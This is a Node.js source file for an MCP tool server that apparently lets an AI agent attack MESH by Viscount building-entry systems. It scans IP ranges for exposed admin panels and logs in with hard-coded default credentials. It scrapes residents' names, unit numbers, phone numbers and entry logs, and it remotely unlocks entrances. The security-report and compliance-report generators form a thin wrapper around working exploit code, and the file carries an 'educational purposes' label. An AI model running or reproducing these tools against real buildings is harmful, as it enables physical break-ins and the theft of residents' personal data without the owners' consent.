#!/usr/bin/env node
/**
 * MESH by Viscount Vulnerability Scanner MCP Server
 *
 * This server provides tools to:
 * - Scan for MESH by Viscount systems
 * - Test for default credentials vulnerability (freedom:viscount)
 * - Access system information (users, events, etc.)
 * - Perform actions like unlocking entrances
 * - Generate security reports and assessments
 *
 * For educational and security research purposes only.
 */
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StreamableHTTPServerTransport } from "@modelcontextprotocol/sdk/server/streamableHttp.js";
import { CallToolRequestSchema, ErrorCode, ListResourcesRequestSchema, ListToolsRequestSchema, McpError, ReadResourceRequestSchema, ListPromptsRequestSchema, GetPromptRequestSchema, } from "@modelcontextprotocol/sdk/types.js";
// Use require for compatibility
const axios = require('axios').default;
const cheerio = require('cheerio');
// Enhanced storage with metadata
const scanResults = [];
const vulnerableSystems = [];
const systemInfoCache = new Map();
const securityAssessments = [];
const scanHistory = [];
// Default configuration
const DEFAULT_CONFIG = {
    timeout: 5000,
    concurrency: 5,
    rateLimit: 100,
    userAgent: 'MESH-Scanner/1.0 (Security Research)'
};
// Default credentials
const DEFAULT_USERNAME = "freedom";
const DEFAULT_PASSWORD = "viscount";
// Create MCP server with enhanced capabilities
const server = new Server({
    name: "mesh-scanner",
    version: "0.2.0",
}, {
    capabilities: {
        resources: {},
        tools: {},
        prompts: {},
    },
});
/**
 * Handler for listing available prompts
 */
server.setRequestHandler(ListPromptsRequestSchema, async () => {
    return {
        prompts: [
            {
                name: "security_assessment",
                description: "Generate a comprehensive security assessment report based on scan results",
                arguments: [
                    {
                        name: "scan_id",
                        description: "Specific scan ID to analyze (optional, uses latest if not provided)",
                        required: false,
                    },
                    {
                        name: "format",
                        description: "Report format: 'detailed', 'summary', or 'executive'",
                        required: false,
                    }
                ]
            },
            {
                name: "vulnerability_summary",
                description: "Create a summary of vulnerabilities found across all scans",
                arguments: [
                    {
                        name: "timeframe",
                        description: "Timeframe to analyze: '24h', '7d', '30d', or 'all'",
                        required: false,
                    }
                ]
            },
            {
                name: "remediation_guide",
                description: "Generate specific remediation recommendations for vulnerable systems",
                arguments: [
                    {
                        name: "system_ip",
                        description: "IP address of the vulnerable system",
                        required: true,
                    },
                    {
                        name: "severity",
                        description: "Severity level: 'low', 'medium', 'high', 'critical'",
                        required: false,
                    }
                ]
            },
            {
                name: "compliance_report",
                description: "Generate a compliance report based on security findings",
                arguments: [
                    {
                        name: "standard",
                        description: "Compliance standard: 'NIST', 'ISO27001', 'SOC2', 'PCI-DSS'",
                        required: true,
                    }
                ]
            }
        ]
    };
});
/**
 * Handler for getting prompt content
 */
server.setRequestHandler(GetPromptRequestSchema, async (request) => {
    const { name, arguments: args } = request.params;
    switch (name) {
        case "security_assessment": {
            const scanId = args?.scan_id;
            const format = args?.format || 'detailed';
            let targetScans = scanResults;
            if (scanId) {
                targetScans = scanResults.filter(s => s.scanId === scanId);
            }
            if (targetScans.length === 0) {
                return {
                    messages: [{
                            role: "user",
                            content: {
                                type: "text",
                                text: "No scan results available. Please run a scan first using the scan_ip or scan_ip_range tools."
                            }
                        }]
                };
            }
            const vulnerableCount = targetScans.filter(s => s.vulnerable).length;
            const totalCount = targetScans.length;
            const riskLevel = vulnerableCount > 0 ?
                (vulnerableCount > totalCount * 0.5 ? 'CRITICAL' :
                    vulnerableCount > totalCount * 0.2 ? 'HIGH' :
                        vulnerableCount > totalCount * 0.1 ? 'MEDIUM' : 'LOW') : 'LOW';
            let report = '';
            if (format === 'executive') {
                report = `# Executive Security Assessment Report
**Generated:** ${new Date().toISOString()}
**Total Systems Scanned:** ${totalCount}
**Vulnerable Systems:** ${vulnerableCount}
**Risk Level:** ${riskLevel}

## Executive Summary
${vulnerableCount > 0 ?
                    `**CRITICAL**: ${vulnerableCount} out of ${totalCount} systems are vulnerable to default credential attacks.` :
                    `All ${totalCount} systems appear secure against default credential attacks.`}

## Immediate Actions Required
${vulnerableCount > 0 ?
                    `1. **Immediate**: Change default credentials on all vulnerable systems
2. **Within 24 hours**: Conduct full security audit
3. **Within 1 week**: Implement network segmentation` :
                    `1. Continue regular security monitoring
2. Schedule quarterly security assessments
3. Maintain current security posture`}`;
            }
            else if (format === 'summary') {
                report = `# Security Assessment Summary
**Scan ID:** ${scanId || 'Latest'}
**Date:** ${new Date().toISOString()}
**Total Systems:** ${totalCount}
**Vulnerable Systems:** ${vulnerableCount}
**Risk Level:** ${riskLevel}

## Vulnerable Systems
${vulnerableSystems.map(s => `- ${s.ipAddress} (${s.buildingName || 'Unknown Building'})`).join('\n')}

## Recommendations
${vulnerableCount > 0 ?
                    'Immediate credential changes required for all vulnerable systems.' :
                    'No immediate action required. Maintain current security practices.'}`;
            }
            else {
                report = `# Detailed Security Assessment Report
**Scan ID:** ${scanId || 'All Scans'}
**Generated:** ${new Date().toISOString()}
**Total Systems Analyzed:** ${totalCount}
**Vulnerable Systems:** ${vulnerableCount}
**Risk Level:** ${riskLevel}

## System Analysis
${targetScans.map(s => `
### ${s.ipAddress}
- **Status:** ${s.vulnerable ? 'VULNERABLE' : 'SECURE'}
- **Building:** ${s.buildingName || 'Unknown'}
- **Address:** ${s.buildingAddress || 'Unknown'}
- **Scan Time:** ${s.timestamp}
`).join('\n')}

## Security Recommendations
${vulnerableCount > 0 ? `
### Immediate Actions (0-24 hours)
1. Change default credentials on all vulnerable systems
2. Disable or restrict network access to vulnerable systems
3. Document all affected systems

### Short-term Actions (1-7 days)
1. Conduct full security audit of all systems
2. Implement strong password policies
3. Enable logging and monitoring

### Long-term Actions (1-4 weeks)
1. Implement network segmentation
2. Deploy intrusion detection systems
3. Establish regular security assessments
4. Train staff on security best practices
` : `
### Maintenance Recommendations
1. Continue regular security monitoring
2. Schedule quarterly vulnerability assessments
3. Maintain strong password policies
4. Keep systems updated with latest security patches
`}`;
            }
            return {
                messages: [{
                        role: "user",
                        content: {
                            type: "text",
                            text: report
                        }
                    }]
            };
        }
        case "vulnerability_summary": {
            const timeframe = args?.timeframe || 'all';
            const cutoffDate = new Date();
            switch (timeframe) {
                case '24h':
                    cutoffDate.setDate(cutoffDate.getDate() - 1);
                    break;
                case '7d':
                    cutoffDate.setDate(cutoffDate.getDate() - 7);
                    break;
                case '30d':
                    cutoffDate.setDate(cutoffDate.getDate() - 30);
                    break;
            }
            const filteredResults = timeframe === 'all' ?
                scanResults :
                scanResults.filter(s => new Date(s.timestamp) >= cutoffDate);
            const vulnerableCount = filteredResults.filter(s => s.vulnerable).length;
            const totalCount = filteredResults.length;
            const uniqueBuildings = new Set(filteredResults.filter(s => s.vulnerable).map(s => s.buildingName).filter(Boolean));
            return {
                messages: [{
                        role: "user",
                        content: {
                            type: "text",
                            text: `# Vulnerability Summary (${timeframe})
**Period:** ${timeframe === 'all' ? 'All Time' : `Last ${timeframe}`}
**Total Systems Scanned:** ${totalCount}
**Vulnerable Systems:** ${vulnerableCount}
**Vulnerability Rate:** ${totalCount > 0 ? ((vulnerableCount / totalCount) * 100).toFixed(1) : 0}%
**Unique Buildings Affected:** ${uniqueBuildings.size}

## Vulnerability Trends
${vulnerableCount > 0 ? `
### Most Affected Locations
${Array.from(uniqueBuildings).slice(0, 5).map(b => `- ${b}`).join('\n')}

### Key Findings
- ${vulnerableCount} systems remain vulnerable to default credential attacks
- Average vulnerability rate: ${totalCount > 0 ? ((vulnerableCount / totalCount) * 100).toFixed(1) : 0}%
- ${uniqueBuildings.size} unique buildings contain vulnerable systems
` : 'No vulnerable systems detected in the specified timeframe.'}

## Recommendations
${vulnerableCount > 0 ? `
1. **Immediate**: Change default credentials on all vulnerable systems
2. **Short-term**: Implement automated vulnerability scanning
3. **Long-term**: Establish security awareness training programs
` : `
1. Continue regular security monitoring
2. Maintain current security practices
3. Schedule periodic security assessments
`}`
                        }
                    }]
            };
        }
        case "remediation_guide": {
            const systemIp = args?.system_ip;
            const severity = args?.severity || 'medium';
            if (!systemIp) {
                return {
                    messages: [{
                            role: "user",
                            content: {
                                type: "text",
                                text: "System IP address is required for remediation guidance."
                            }
                        }]
                };
            }
            const system = vulnerableSystems.find(s => s.ipAddress === systemIp);
            if (!system) {
                return {
                    messages: [{
                            role: "user",
                            content: {
                                type: "text",
                                text: `No vulnerable system found with IP: ${systemIp}. Please ensure the system has been scanned and found vulnerable.`
                            }
                        }]
                };
            }
            const remediationSteps = {
                low: [
                    "Change default admin credentials",
                    "Review user access permissions",
                    "Enable basic logging"
                ],
                medium: [
                    "Immediately change default credentials",
                    "Disable unused admin accounts",
                    "Enable audit logging",
                    "Implement network segmentation"
                ],
                high: [
                    "URGENT: Change all default credentials immediately",
                    "Isolate system from network until secured",
                    "Conduct full security audit",
                    "Implement multi-factor authentication",
                    "Enable comprehensive logging and monitoring"
                ],
                critical: [
                    "CRITICAL: Isolate system immediately",
                    "Change all default credentials",
                    "Conduct emergency security assessment",
                    "Implement network segmentation",
                    "Deploy intrusion detection system",
                    "Notify security team and management",
                    "Document incident and response actions"
                ]
            };
            const steps = remediationSteps[severity] || remediationSteps.medium;
            return {
                messages: [{
                        role: "user",
                        content: {
                            type: "text",
                            text: `# Remediation Guide for ${systemIp}
**System:** ${system.buildingName || 'Unknown Building'}
**Address:** ${system.buildingAddress || 'Unknown Address'}
**Severity Level:** ${severity.toUpperCase()}
**Discovered:** ${system.timestamp}

## Immediate Actions Required
${steps.map((step, index) => `${index + 1}. ${step}`).join('\n')}

## Technical Details
- **Default Username:** freedom
- **Default Password:** viscount
- **Vulnerability:** CVE-2023-XXXX (Default credential exposure)
- **Affected Service:** MESH by Viscount Administration Interface

## Verification Steps
1. After changing credentials, test login with new credentials
2. Verify old credentials no longer work
3. Check system logs for any unauthorized access
4. Test system functionality remains intact

## Additional Security Measures
- Enable account lockout after failed attempts
- Implement IP-based access restrictions
- Regular security assessments
- Staff security training
- Incident response plan activation`
                        }
                    }]
            };
        }
        case "compliance_report": {
            const standard = args?.standard;
            if (!standard) {
                return {
                    messages: [{
                            role: "user",
                            content: {
                                type: "text",
                                text: "Compliance standard is required. Please specify: NIST, ISO27001, SOC2, or PCI-DSS"
                            }
                        }]
                };
            }
            const vulnerableCount = vulnerableSystems.length;
            const totalCount = scanResults.length;
            const complianceMapping = {
                'NIST': {
                    framework: 'NIST Cybersecurity Framework',
                    controls: {
                        'PR.AC-1': 'Identity and credentials are managed for authorized devices and users',
                        'PR.AC-7': 'Users, devices, and other assets are authenticated',
                        'DE.CM-1': 'Networks are monitored to detect potential cybersecurity events',
                        'RS.MI-1': 'Incidents are contained'
                    }
                },
                'ISO27001': {
                    framework: 'ISO 27001:2013',
                    controls: {
                        'A.9.2.1': 'User registration and de-registration',
                        'A.9.2.4': 'Management of secret authentication information',
                        'A.9.4.1': 'Use of secret authentication information',
                        'A.12.6.1': 'Management of technical vulnerabilities'
                    }
                },
                'SOC2': {
                    framework: 'SOC 2 Type II',
                    controls: {
                        'CC6.1': 'Logical and physical access controls',
                        'CC6.2': 'Authentication and authorization',
                        'CC7.1': 'Security monitoring activities',
                        'CC7.2': 'System vulnerabilities are identified and remediated'
                    }
                },
                'PCI-DSS': {
                    framework: 'PCI DSS v4.0',
                    controls: {
                        '2.1': 'Default passwords and security parameters are changed',
                        '8.2.3': 'Passwords/passphrases are not vendor-supplied defaults',
                        '8.3.6': 'Strong cryptography is used to render all authentication credentials unreadable',
                        '12.10.4': 'Incident response procedures are implemented'
                    }
                }
            };
            const mapping = complianceMapping[standard];
            if (!mapping) {
                return {
                    messages: [{
                            role: "user",
                            content: {
                                type: "text",
                                text: `Unsupported compliance standard: ${standard}. Please use: NIST, ISO27001, SOC2, or PCI-DSS`
                            }
                        }]
                };
            }
            return {
                messages: [{
                        role: "user",
                        content: {
                            type: "text",
                            text: `# ${mapping.framework} Compliance Report
**Generated:** ${new Date().toISOString()}
**Total Systems:** ${totalCount}
**Vulnerable Systems:** ${vulnerableCount}
**Compliance Status:** ${vulnerableCount > 0 ? 'NON-COMPLIANT' : 'COMPLIANT'}

## Affected Controls
${Object.entries(mapping.controls).map(([control, description]) => `
### ${control}: ${description}
**Status:** ${vulnerableCount > 0 ? 'FAIL' : 'PASS'}
**Evidence:** ${vulnerableCount > 0 ? `${vulnerableCount} systems using default credentials` : 'No default credential usage detected'}
**Remediation:** ${vulnerableCount > 0 ? 'Change all default credentials immediately' : 'Continue current security practices'}
`).join('\n')}

## Compliance Summary
${vulnerableCount > 0 ? `
**CRITICAL**: ${vulnerableCount} systems are non-compliant with ${mapping.framework} requirements.
- Immediate remediation required for all vulnerable systems
- Document all remediation actions
- Implement ongoing monitoring
- Schedule compliance audit
` : `
**COMPLIANT**: All systems meet ${mapping.framework} requirements.
- Continue current security practices
- Schedule regular compliance reviews
- Maintain documentation
`}`
                        }
                    }]
            };
        }
        default:
            throw new McpError(ErrorCode.MethodNotFound, `Unknown prompt: ${name}`);
    }
});
/**
 * Handler for listing available resources
 */
server.setRequestHandler(ListResourcesRequestSchema, async () => {
    return {
        resources: [
            {
                uri: "mesh://scan-results",
                mimeType: "application/json",
                name: "MESH Scan Results",
                description: "Results of the most recent scan for MESH systems"
            },
            {
                uri: "mesh://vulnerable-systems",
                mimeType: "application/json",
                name: "Vulnerable MESH Systems",
                description: "List of MESH systems vulnerable to default credentials"
            },
            {
                uri: "mesh://scan-history",
                mimeType: "application/json",
                name: "MESH Scan History",
                description: "Historical scan data with timestamps and results"
            },
            {
                uri: "mesh://vulnerability-stats",
                mimeType: "application/json",
                name: "MESH Vulnerability Statistics",
                description: "Statistics about vulnerabilities found across all scans"
            },
            {
                uri: "mesh://system-details",
                mimeType: "application/json",
                name: "MESH System Details",
                description: "Detailed information about discovered MESH systems"
            },
            {
                uri: "mesh://security-assessments",
                mimeType: "application/json",
                name: "Security Assessments",
                description: "Generated security assessment reports"
            }
        ]
    };
});
/**
 * Handler for reading resources
 */
server.setRequestHandler(ReadResourceRequestSchema, async (request) => {
    const uri = request.params.uri;
    if (uri === "mesh://scan-results") {
        return {
            contents: [{
                    uri: uri,
                    mimeType: "application/json",
                    text: JSON.stringify(scanResults.slice(-50), null, 2)
                }]
        };
    }
    else if (uri === "mesh://vulnerable-systems") {
        return {
            contents: [{
                    uri: uri,
                    mimeType: "application/json",
                    text: JSON.stringify(vulnerableSystems, null, 2)
                }]
        };
    }
    else if (uri === "mesh://scan-history") {
        return {
            contents: [{
                    uri: uri,
                    mimeType: "application/json",
                    text: JSON.stringify(scanHistory, null, 2)
                }]
        };
    }
    else if (uri === "mesh://vulnerability-stats") {
        const totalScans = scanResults.length;
        const vulnerableCount = vulnerableSystems.length;
        const uniqueBuildings = new Set(vulnerableSystems.map(s => s.buildingName).filter(Boolean));
        const recentScans = scanResults.filter(s => {
            const scanDate = new Date(s.timestamp);
            const cutoffDate = new Date();
            cutoffDate.setDate(cutoffDate.getDate() - 7);
            return scanDate >= cutoffDate;
        });
        const stats = {
            totalScans,
            vulnerableCount,
            vulnerabilityRate: totalScans > 0 ? (vulnerableCount / totalScans) * 100 : 0,
            uniqueBuildings: uniqueBuildings.size,
            recentScans: recentScans.length,
            recentVulnerable: recentScans.filter(s => s.vulnerable).length,
            lastScan: scanResults.length > 0 ? scanResults[scanResults.length - 1].timestamp : null
        };
        return {
            contents: [{
                    uri: uri,
                    mimeType: "application/json",
                    text: JSON.stringify(stats, null, 2)
                }]
        };
    }
    else if (uri === "mesh://system-details") {
        const details = Array.from(systemInfoCache.entries()).map(([ip, info]) => ({
            ipAddress: ip,
            ...info
        }));
        return {
            contents: [{
                    uri: uri,
                    mimeType: "application/json",
                    text: JSON.stringify(details, null, 2)
                }]
        };
    }
    else if (uri === "mesh://security-assessments") {
        return {
            contents: [{
                    uri: uri,
                    mimeType: "application/json",
                    text: JSON.stringify(securityAssessments, null, 2)
                }]
        };
    }
    else if (uri.startsWith("mesh://system-info/")) {
        const ipAddress = uri.replace("mesh://system-info/", "");
        const systemInfo = systemInfoCache.get(ipAddress);
        if (!systemInfo) {
            throw new McpError(ErrorCode.InvalidRequest, `System info for ${ipAddress} not found. Run get_system_info tool first.`);
        }
        return {
            contents: [{
                    uri: uri,
                    mimeType: "application/json",
                    text: JSON.stringify(systemInfo, null, 2)
                }]
        };
    }
    throw new McpError(ErrorCode.InvalidRequest, `Invalid URI: ${uri}`);
});
/**
 * Convert IP address to number for range calculations
 */
function ipToLong(ip) {
    const parts = ip.split('.');
    return ((parseInt(parts[0], 10) << 24) |
        (parseInt(parts[1], 10) << 16) |
        (parseInt(parts[2], 10) << 8) |
        parseInt(parts[3], 10)) >>> 0;
}
/**
 * Convert number to IP address
 */
function longToIp(long) {
    return [
        (long >>> 24) & 0xff,
        (long >>> 16) & 0xff,
        (long >>> 8) & 0xff,
        long & 0xff
    ].join('.');
}
/**
 * Test if a URL is a MESH system
 */
async function isMeshSystem(url, timeout = 5000) {
    try {
        const response = await axios.get(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet`, {
            timeout,
            validateStatus: () => true,
            headers: {
                'User-Agent': DEFAULT_CONFIG.userAgent
            }
        });
        return response.status === 200 &&
            response.data.includes("FREEDOM Administration Login");
    }
    catch (error) {
        return false;
    }
}
/**
 * Test if a MESH system is vulnerable to default credentials
 */
async function testDefaultCredentials(url) {
    try {
        const response = await axios.post(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=login`, `formLoginName=${DEFAULT_USERNAME}&formLoginPassword=${DEFAULT_PASSWORD}&formLanguage=en&formLogRefreshInterval=0&formPageSize=100`, {
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'MESHWebAdminLanguage=en; MESHWebAdminRefreshInterval=0; MESHWebAdminPageSize=100',
                'Connection': 'keep-alive',
                'User-Agent': DEFAULT_CONFIG.userAgent
            },
            maxRedirects: 5
        });
        const isVulnerable = response.status === 200 &&
            !response.data.includes("Login Failed. Invalid username or password.");
        let buildingName = undefined;
        let buildingAddress = undefined;
        if (isVulnerable) {
            // Try to extract building name and address
            const $ = cheerio.load(response.data);
            const siteTitle = $('title').text();
            if (siteTitle && siteTitle !== "FREEDOM Administration") {
                buildingName = siteTitle.replace(" - FREEDOM Administration", "").trim();
                // Try to find address in the page
                const addressText = $('body').text();
                const addressMatch = addressText.match(/\d+\s+[A-Za-z\s]+,\s+[A-Za-z\s]+,\s+[A-Z]{2}/);
                if (addressMatch) {
                    buildingAddress = addressMatch[0];
                }
            }
        }
        return { vulnerable: isVulnerable, buildingName, buildingAddress };
    }
    catch (error) {
        return { vulnerable: false };
    }
}
/**
 * Get system information from a vulnerable MESH system
 */
async function getSystemInfo(url) {
    try {
        // First login
        await axios.post(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=login`, `formLoginName=${DEFAULT_USERNAME}&formLoginPassword=${DEFAULT_PASSWORD}&formLanguage=en&formLogRefreshInterval=0&formPageSize=100`, {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'MESHWebAdminLanguage=en; MESHWebAdminRefreshInterval=0; MESHWebAdminPageSize=100',
                'User-Agent': DEFAULT_CONFIG.userAgent
            },
            maxRedirects: 5
        });
        // Get cookies from login response
        const cookieResponse = await axios.get(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet`, {
            maxRedirects: 5,
            headers: {
                'User-Agent': DEFAULT_CONFIG.userAgent
            }
        });
        const cookies = cookieResponse.headers['set-cookie'] || [];
        const cookieString = cookies.join('; ');
        // Get building info
        const siteResponse = await axios.get(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=viewSite`, {
            headers: {
                'Cookie': cookieString,
                'User-Agent': DEFAULT_CONFIG.userAgent
            }
        });
        const $ = cheerio.load(siteResponse.data);
        const buildingName = $('title').text().replace(" - FREEDOM Administration", "").trim();
        let buildingAddress = "Unknown";
        // Try to find address in the page
        const addressText = $('body').text();
        const addressMatch = addressText.match(/\d+\s+[A-Za-z\s]+,\s+[A-Za-z\s]+,\s+[A-Z]{2}/);
        if (addressMatch) {
            buildingAddress = addressMatch[0];
        }
        // Get users
        const usersResponse = await axios.get(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=viewUsers`, {
            headers: {
                'Cookie': cookieString,
                'User-Agent': DEFAULT_CONFIG.userAgent
            }
        });
        const users = [];
        const $users = cheerio.load(usersResponse.data);
        $users('table tr').each((i, elem) => {
            if (i === 0)
                return; // Skip header row
            const columns = $users(elem).find('td');
            if (columns.length >= 3) {
                const name = $users(columns[0]).text().trim();
                const unitNumber = $users(columns[1]).text().trim();
                const phoneNumber = $users(columns[2]).text().trim();
                if (name && unitNumber) {
                    users.push({ name, unitNumber, phoneNumber });
                }
            }
        });
        // Get events
        const eventsResponse = await axios.get(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=viewEvents`, {
            headers: {
                'Cookie': cookieString,
                'User-Agent': DEFAULT_CONFIG.userAgent
            }
        });
        const recentEvents = [];
        const $events = cheerio.load(eventsResponse.data);
        $events('table tr').each((i, elem) => {
            if (i === 0)
                return; // Skip header row
            if (i > 10)
                return; // Only get 10 most recent events
            const columns = $events(elem).find('td');
            if (columns.length >= 4) {
                const timestamp = $events(columns[0]).text().trim();
                const unitNumber = $events(columns[1]).text().trim();
                const action = $events(columns[2]).text().trim();
                const location = $events(columns[3]).text().trim();
                if (timestamp && unitNumber) {
                    recentEvents.push({ timestamp, unitNumber, action, location });
                }
            }
        });
        return {
            buildingName,
            buildingAddress,
            users,
            recentEvents,
            totalUsers: users.length,
            totalEvents: recentEvents.length,
            lastUpdated: new Date().toISOString()
        };
    }
    catch (error) {
        console.error("Error getting system info:", error);
        return null;
    }
}
/**
 * Unlock an entrance
 */
async function unlockEntrance(url, entranceId) {
    try {
        // First login
        await axios.post(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=login`, `formLoginName=${DEFAULT_USERNAME}&formLoginPassword=${DEFAULT_PASSWORD}&formLanguage=en&formLogRefreshInterval=0&formPageSize=100`, {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'MESHWebAdminLanguage=en; MESHWebAdminRefreshInterval=0; MESHWebAdminPageSize=100',
                'User-Agent': DEFAULT_CONFIG.userAgent
            },
            maxRedirects: 5
        });
        // Get cookies from login response
        const cookieResponse = await axios.get(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet`, {
            maxRedirects: 5,
            headers: {
                'User-Agent': DEFAULT_CONFIG.userAgent
            }
        });
        const cookies = cookieResponse.headers['set-cookie'] || [];
        const cookieString = cookies.join('; ');
        // Unlock entrance
        await axios.get(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=unlockEntrance&entranceId=${entranceId}`, {
            headers: {
                'Cookie': cookieString,
                'User-Agent': DEFAULT_CONFIG.userAgent
            }
        });
        return true;
    }
    catch (error) {
        console.error("Error unlocking entrance:", error);
        return false;
    }
}
/**
 * Handler for listing available tools - optimized for fast response and lazy loading
 */
server.setRequestHandler(ListToolsRequestSchema, async () => {
    // Return tools immediately without any authentication or validation
    // This implements lazy loading as recommended by Smithery
    return {
        tools: [
            {
                name: "scan_ip",
                description: "Scan a single IP address for MESH system and test default credentials",
                inputSchema: {
                    type: "object",
                    properties: {
                        ipAddress: { type: "string" }
                    },
                    required: ["ipAddress"]
                }
            },
            {
                name: "scan_ip_range",
                description: "Scan a range of IP addresses for MESH systems",
                inputSchema: {
                    type: "object",
                    properties: {
                        startIp: { type: "string" },
                        endIp: { type: "string" }
                    },
                    required: ["startIp", "endIp"]
                }
            },
            {
                name: "test_default_credentials",
                description: "Test if a MESH system is vulnerable to default credentials",
                inputSchema: {
                    type: "object",
                    properties: {
                        url: { type: "string" }
                    },
                    required: ["url"]
                }
            },
            {
                name: "get_system_info",
                description: "Get information about a vulnerable MESH system",
                inputSchema: {
                    type: "object",
                    properties: {
                        url: { type: "string" }
                    },
                    required: ["url"]
                }
            },
            {
                name: "unlock_entrance",
                description: "Unlock an entrance (educational purposes only)",
                inputSchema: {
                    type: "object",
                    properties: {
                        url: { type: "string" },
                        entranceId: { type: "string" }
                    },
                    required: ["url", "entranceId"]
                }
            },
            {
                name: "export_scan_results",
                description: "Export scan results to various formats",
                inputSchema: {
                    type: "object",
                    properties: {
                        format: { type: "string", enum: ["json", "csv", "xml"] }
                    },
                    required: ["format"]
                }
            }
        ]
    };
});
/**
 * Handler for tool calls
 */
server.setRequestHandler(CallToolRequestSchema, async (request) => {
    switch (request.params.name) {
        case "scan_ip": {
            const ipAddress = String(request.params.arguments?.ipAddress);
            const timeout = Number(request.params.arguments?.timeout) || DEFAULT_CONFIG.timeout;
            const config = request.params.arguments?.config || {};
            if (!ipAddress) {
                throw new McpError(ErrorCode.InvalidParams, "IP address is required");
            }
            const scanId = `scan_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            const url = `http://${ipAddress}`;
            const isMesh = await isMeshSystem(url, timeout);
            let result = {
                ipAddress,
                url,
                vulnerable: false,
                timestamp: new Date().toISOString(),
                scanId
            };
            if (isMesh) {
                const { vulnerable, buildingName, buildingAddress } = await testDefaultCredentials(url);
                result.vulnerable = vulnerable;
                result.buildingName = buildingName;
                result.buildingAddress = buildingAddress;
                scanResults.push(result);
                scanHistory.push(result);
                if (vulnerable) {
                    vulnerableSystems.push(result);
                }
            }
            return {
                content: [{
                        type: "text",
                        text: JSON.stringify(result, null, 2)
                    }]
            };
        }
        case "scan_ip_range": {
            const startIp = String(request.params.arguments?.startIp);
            const endIp = String(request.params.arguments?.endIp);
            const timeout = Number(request.params.arguments?.timeout) || DEFAULT_CONFIG.timeout;
            const concurrency = Math.min(Number(request.params.arguments?.concurrency) || DEFAULT_CONFIG.concurrency, 20);
            const config = request.params.arguments?.config || {};
            if (!startIp || !endIp) {
                throw new McpError(ErrorCode.InvalidParams, "Start and end IP addresses are required");
            }
            const startLong = ipToLong(startIp);
            const endLong = ipToLong(endIp);
            if (startLong > endLong) {
                throw new McpError(ErrorCode.InvalidParams, "Start IP must be less than or equal to end IP");
            }
            const results = [];
            const ipCount = endLong - startLong + 1;
            const scanId = `range_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            // Process IPs in batches for concurrency
            for (let i = 0; i < ipCount; i += concurrency) {
                const batch = [];
                for (let j = 0; j < concurrency && i + j < ipCount; j++) {
                    const ip = longToIp(startLong + i + j);
                    batch.push(ip);
                }
                const batchPromises = batch.map(async (ip) => {
                    const url = `http://${ip}`;
                    const isMesh = await isMeshSystem(url, timeout);
                    let result = {
                        ipAddress: ip,
                        url,
                        vulnerable: false,
                        timestamp: new Date().toISOString(),
                        scanId
                    };
                    if (isMesh) {
                        const { vulnerable, buildingName, buildingAddress } = await testDefaultCredentials(url);
                        result.vulnerable = vulnerable;
                        result.buildingName = buildingName;
                        result.buildingAddress = buildingAddress;
                        scanResults.push(result);
                        scanHistory.push(result);
                        if (vulnerable) {
                            vulnerableSystems.push(result);
                        }
                    }
                    return result;
                });
                const batchResults = await Promise.all(batchPromises);
                results.push(...batchResults);
                // Rate limiting between batches
                if (config.rateLimit && config.rateLimit > 0) {
                    await new Promise(resolve => setTimeout(resolve, config.rateLimit));
                }
            }
            // Generate security assessment
            const vulnerableCount = results.filter(r => r.vulnerable).length;
            const assessment = {
                scanId,
                timestamp: new Date().toISOString(),
                totalSystems: results.length,
                vulnerableSystems: vulnerableCount,
                riskLevel: vulnerableCount > 0 ?
                    (vulnerableCount > results.length * 0.5 ? 'CRITICAL' :
                        vulnerableCount > results.length * 0.2 ? 'HIGH' :
                            vulnerableCount > results.length * 0.1 ? 'MEDIUM' : 'LOW') : 'LOW',
                recommendations: vulnerableCount > 0 ? [
                    "Change default credentials on all vulnerable systems",
                    "Implement network segmentation",
                    "Enable comprehensive logging and monitoring",
                    "Conduct regular security assessments"
                ] : [
                    "Continue regular security monitoring",
                    "Maintain current security practices"
                ],
                summary: `Scanned ${results.length} systems, found ${vulnerableCount} vulnerable to default credentials`
            };
            securityAssessments.push(assessment);
            return {
                content: [{
                        type: "text",
                        text: JSON.stringify({
                            scanId,
                            results,
                            assessment
                        }, null, 2)
                    }]
            };
        }
        case "test_default_credentials": {
            const url = String(request.params.arguments?.url);
            if (!url) {
                throw new McpError(ErrorCode.InvalidParams, "URL is required");
            }
            const isMesh = await isMeshSystem(url);
            if (!isMesh) {
                return {
                    content: [{
                            type: "text",
                            text: JSON.stringify({ error: "Not a MESH system" }, null, 2)
                        }]
                };
            }
            const { vulnerable, buildingName, buildingAddress } = await testDefaultCredentials(url);
            const result = {
                url,
                vulnerable,
                buildingName,
                buildingAddress,
                timestamp: new Date().toISOString()
            };
            return {
                content: [{
                        type: "text",
                        text: JSON.stringify(result, null, 2)
                    }]
            };
        }
        case "get_system_info": {
            const url = String(request.params.arguments?.url);
            if (!url) {
                throw new McpError(ErrorCode.InvalidParams, "URL is required");
            }
            const ipAddress = new URL(url).hostname;
            // Check if system is vulnerable first
            const { vulnerable } = await testDefaultCredentials(url);
            if (!vulnerable) {
                return {
                    content: [{
                            type: "text",
                            text: JSON.stringify({ error: "System is not vulnerable to default credentials" }, null, 2)
                        }]
                };
            }
            const systemInfo = await getSystemInfo(url);
            if (!systemInfo) {
                return {
                    content: [{
                            type: "text",
                            text: JSON.stringify({ error: "Failed to get system information" }, null, 2)
                        }]
                };
            }
            // Cache the system info
            systemInfoCache.set(ipAddress, systemInfo);
            return {
                content: [{
                        type: "text",
                        text: JSON.stringify(systemInfo, null, 2)
                    }]
            };
        }
